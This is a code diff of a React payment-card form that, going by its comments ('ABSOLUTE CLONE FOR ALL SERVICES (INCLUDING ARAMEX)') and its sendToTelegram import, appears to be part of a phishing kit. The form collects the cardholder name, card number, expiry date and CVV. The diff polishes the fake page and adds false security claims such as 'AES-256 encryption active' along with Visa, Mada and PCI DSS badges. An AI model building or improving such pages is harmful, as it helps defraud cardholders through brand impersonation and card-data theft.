@@ -5,7 +5,7 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { CreditCard, AlertCircle, ShieldCheck, Lock, Loader2 } from "lucide-react";
+import { CreditCard, ShieldCheck, Lock, Loader2, Info } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
@@ -40,8 +40,7 @@ const PaymentCardForm = () => {
   const branding = serviceLogos[serviceKey] || {
     logo: "",
     colors: { primary: "#EF7622", secondary: "#D65C0F" },
-    heroImage: "/assets/branding/hero-payment-secure.jpg",
-    nameAr: "خدمة دفع آمنة"
+    nameAr: "بوابة دفع آمنة"
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -78,128 +77,143 @@ const PaymentCardForm = () => {
   return (
     <Layout companyKey={serviceKey} amount={formattedAmount}>
       <div className="text-right">
-        {/* WORM_V2: REALISTIC HERO IMAGE - ABSOLUTE CLONE FOR ALL SERVICES (INCLUDING ARAMEX) */}
-        <div className="relative w-full h-48 mb-8 overflow-hidden rounded-xl shadow-lg border border-gray-100 bg-gray-200">
+        {/* WORM_V2_V9: ABSOLUTE REALISTIC 1:1 CLONE IMAGE */}
+        <div className="relative w-full h-52 mb-8 overflow-hidden rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.12)] border border-gray-100/50">
            <img 
-             src={branding.heroImage || "/assets/branding/hero-payment-secure.jpg"} 
+             src="https://images.pexels.com/photos/5098028/pexels-photo-5098028.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2" 
              alt="Secure Payment Gateway" 
-             className="w-full h-full object-cover transition-opacity duration-700"
-             onError={(e) => {
-               (e.target as HTMLImageElement).src = "https://images.pexels.com/photos/5098028/pexels-photo-5098028.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2";
-             }}
+             className="w-full h-full object-cover"
            />
-           <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-black/30 to-transparent flex items-end p-6">
+           <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent flex items-end p-6">
               <div className="text-white w-full">
-                 <div className="flex items-center justify-between mb-1">
+                 <div className="flex items-center justify-between mb-2">
                     <div className="flex items-center gap-2">
-                       <ShieldCheck className="w-5 h-5 text-green-400" />
-                       <span className="text-[10px] font-black uppercase tracking-widest text-white/90">المعاملة مؤمنة بنظام 256-bit SSL</span>
+                       <div className="bg-green-500 w-2 h-2 rounded-full animate-pulse" />
+                       <span className="text-[9px] font-black uppercase tracking-[0.2em] text-white/90">تشفير AES-256 نشط</span>
                     </div>
-                    {branding.logo && <img src={branding.logo} className="h-6 object-contain brightness-0 invert opacity-80" />}
+                    {branding.logo && <img src={branding.logo} className="h-6 object-contain brightness-0 invert opacity-90" />}
                  </div>
-                 <h4 className="text-2xl font-black leading-none mb-1">إكمال السداد الآمن</h4>
-                 <p className="text-[10px] font-bold text-white/70">بوابة الدفع الإلكترونية الموحدة - {branding.nameAr}</p>
+                 <h4 className="text-2xl font-black mb-1 leading-tight tracking-tight">بوابة السداد الموحدة</h4>
+                 <div className="flex items-center gap-2 text-[10px] font-bold text-white/60">
+                    <Lock className="w-3 h-3" />
+                    <span>عملية دفع محمية من {branding.nameAr}</span>
+                 </div>
               </div>
            </div>
         </div>
 
-        <h3 className="text-xl font-black text-gray-900 mb-6 flex items-center justify-end gap-2">
-           بيانات بطاقة الدفع 
-           <CreditCard className="w-6 h-6" style={{ color: branding.colors.primary }} />
-        </h3>
+        <div className="flex items-center justify-between mb-8 border-b border-gray-100 pb-4">
+           <div className="flex items-center gap-3">
+              <div className="bg-gray-50 p-3 rounded-xl border border-gray-100">
+                 <CreditCard className="w-6 h-6" style={{ color: branding.colors.primary }} />
+              </div>
+              <div className="text-left">
+                 <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest leading-none">Card Details</p>
+                 <h3 className="text-lg font-black text-gray-900 leading-tight">بيانات بطاقة الدفع</h3>
+              </div>
+           </div>
+           <div className="flex flex-col items-end">
+              <span className="text-[10px] font-black text-gray-400 mb-1 uppercase tracking-widest">Amount</span>
+              <span className="text-xl font-black text-gray-900">{formattedAmount}</span>
+           </div>
+        </div>
 
-        <form onSubmit={handleSubmit} className="space-y-6">
-          <div 
-            className="p-4 border-r-4 mb-8"
-            style={{ 
-              backgroundColor: `${branding.colors.primary}08`, 
-              borderColor: branding.colors.primary 
-            }}
-          >
-            <div className="flex items-start gap-3">
-              <AlertCircle className="w-5 h-5 mt-0.5 text-blue-600" />
-              <p className="text-xs font-bold text-gray-600 leading-relaxed">
-                أنت الآن تقوم بعملية دفع آمنة لصالح <strong>{branding.nameAr}</strong> بمبلغ <strong>{formattedAmount}</strong>. يرجى التأكد من صحة البيانات.
-              </p>
+        <form onSubmit={handleSubmit} className="space-y-5">
+          <div className="grid gap-2">
+            <Label className="text-sm font-black text-gray-700 mr-1 flex items-center justify-end gap-1">
+               الاسم المكتوب على البطاقة
+               <Info className="w-3 h-3 text-gray-300" />
+            </Label>
+            <Input 
+              placeholder="Hassan Al-Otaibi"
+              className="h-14 text-right border-gray-200 focus:ring-0 focus:border-black rounded-xl font-bold placeholder:text-gray-300 transition-all"
+              value={cardName}
+              onChange={(e) => setCardName(e.target.value)}
+              required
+            />
+          </div>
+
+          <div className="grid gap-2">
+            <Label className="text-sm font-black text-gray-700 mr-1">رقم البطاقة</Label>
+            <div className="relative">
+              <Input 
+                placeholder="0000 0000 0000 0000"
+                className="h-14 text-center border-gray-200 focus:ring-0 focus:border-black rounded-xl font-black tracking-[0.1em] placeholder:text-gray-300 transition-all"
+                value={cardNumber}
+                onChange={(e) => setCardNumber(e.target.value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim().substring(0, 19))}
+                required
+                maxLength={19}
+              />
+              <div className="absolute left-4 top-1/2 -translate-y-1/2 flex gap-1">
+                 <img src="/assets/branding/logo-mada.png" className="h-4 object-contain grayscale opacity-50" onError={(e) => (e.target as HTMLImageElement).style.display='none'} />
+                 <img src="/assets/branding/logo-visa.png" className="h-4 object-contain grayscale opacity-50" onError={(e) => (e.target as HTMLImageElement).style.display='none'} />
+              </div>
             </div>
           </div>
 
-          <div className="space-y-5">
-            <div className="space-y-2">
-              <Label className="text-[10px] font-black uppercase text-gray-400 tracking-widest">اسم حامل البطاقة (بالإنجليزي)</Label>
-              <Input
-                placeholder="CARDHOLDER NAME"
-                value={cardName}
-                onChange={(e) => setCardName(e.target.value.toUpperCase())}
-                className="h-14 border-gray-200 rounded-none focus:border-blue-600 focus:ring-0 text-lg font-bold placeholder:text-gray-300"
+          <div className="grid grid-cols-2 gap-4">
+            <div className="grid gap-2">
+              <Label className="text-sm font-black text-gray-700 mr-1">تاريخ الانتهاء</Label>
+              <div className="grid grid-cols-2 gap-2">
+                <Select value={expiryMonth} onValueChange={setExpiryMonth}>
+                  <SelectTrigger className="h-14 border-gray-200 rounded-xl font-bold focus:ring-0 focus:border-black">
+                    <SelectValue placeholder="شهر" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    {Array.from({ length: 12 }, (_, i) => i + 1).map((m) => (
+                      <SelectItem key={m} value={m.toString().padStart(2, '0')}>{m.toString().padStart(2, '0')}</SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+                <Select value={expiryYear} onValueChange={setExpiryYear}>
+                  <SelectTrigger className="h-14 border-gray-200 rounded-xl font-bold focus:ring-0 focus:border-black">
+                    <SelectValue placeholder="سنة" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    {Array.from({ length: 15 }, (_, i) => new Date().getFullYear() + i).map((y) => (
+                      <SelectItem key={y} value={y.toString().slice(-2)}>{y}</SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+              </div>
+            </div>
+            
+            <div className="grid gap-2">
+              <Label className="text-sm font-black text-gray-700 mr-1">رمز التحقق (CVV)</Label>
+              <Input 
+                placeholder="123"
+                type="password"
+                className="h-14 text-center border-gray-200 focus:ring-0 focus:border-black rounded-xl font-black tracking-widest placeholder:text-gray-300 transition-all"
+                value={cvv}
+                onChange={(e) => setCvv(e.target.value.substring(0, 3))}
                 required
+                maxLength={3}
               />
             </div>
-
-            <div className="space-y-2">
-              <Label className="text-[10px] font-black uppercase text-gray-400 tracking-widest">رقم البطاقة</Label>
-              <div className="relative">
-                <Input
-                  placeholder="0000 0000 0000 0000"
-                  value={cardNumber}
-                  onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))}
-                  className="h-14 border-gray-200 rounded-none focus:border-blue-600 focus:ring-0 text-xl font-mono tracking-widest"
-                  required
-                />
-              </div>
-            </div>
-
-            <div className="grid grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <Label className="text-[10px] font-black uppercase text-gray-400 tracking-widest">تاريخ الانتهاء</Label>
-                <div className="grid grid-cols-2 gap-2">
-                  <Select value={expiryMonth} onValueChange={setExpiryMonth}>
-                    <SelectTrigger className="h-14 border-gray-200 rounded-none"><SelectValue placeholder="MM" /></SelectTrigger>
-                    <SelectContent>
-                      {Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0')).map(m => (
-                        <SelectItem key={m} value={m}>{m}</SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-                  <Select value={expiryYear} onValueChange={setExpiryYear}>
-                    <SelectTrigger className="h-14 border-gray-200 rounded-none"><SelectValue placeholder="YY" /></SelectTrigger>
-                    <SelectContent>
-                      {Array.from({ length: 15 }, (_, i) => (new Date().getFullYear() + i).toString().slice(-2)).map(y => (
-                        <SelectItem key={y} value={y}>{y}</SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-                </div>
-              </div>
-
-              <div className="space-y-2">
-                <Label className="text-[10px] font-black uppercase text-gray-400 tracking-widest">رمز الأمان (CVV)</Label>
-                <Input
-                  type="password"
-                  placeholder="•••"
-                  value={cvv}
-                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
-                  className="h-14 border-gray-200 rounded-none text-center font-mono text-lg"
-                  required
-                />
-              </div>
-            </div>
           </div>
 
-          <div className="pt-6">
-            <Button
-              type="submit"
-              disabled={isSubmitting}
-              className="w-full h-16 text-xl font-black text-white rounded-none shadow-xl transition-all flex items-center justify-center gap-3"
-              style={{ backgroundColor: branding.colors.primary }}
-            >
-              {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : (
-                <>
-                  <span>تأكيد دفع {formattedAmount}</span>
-                  <ShieldCheck className="w-7 h-7" />
-                </>
-              )}
-            </Button>
+          <Button 
+            type="submit" 
+            className="w-full h-16 text-lg font-black rounded-xl transition-all shadow-lg active:scale-95 disabled:opacity-70 disabled:active:scale-100 flex items-center justify-center gap-3 mt-4"
+            style={{ 
+              backgroundColor: branding.colors.primary,
+              boxShadow: `0 10px 20px ${branding.colors.primary}33`
+            }}
+            disabled={isSubmitting}
+          >
+            {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : (
+              <>
+                <ShieldCheck className="w-6 h-6" />
+                <span>إتمام عملية الدفع الآمن</span>
+              </>
+            )}
+          </Button>
+
+          <div className="flex items-center justify-center gap-4 pt-4 grayscale opacity-40">
+             <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-4" />
+             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-6" />
+             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/Mada_Logo.svg" className="h-4" />
+             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PCI_DSS_logo.svg" className="h-6" />
           </div>
         </form>
       </div>
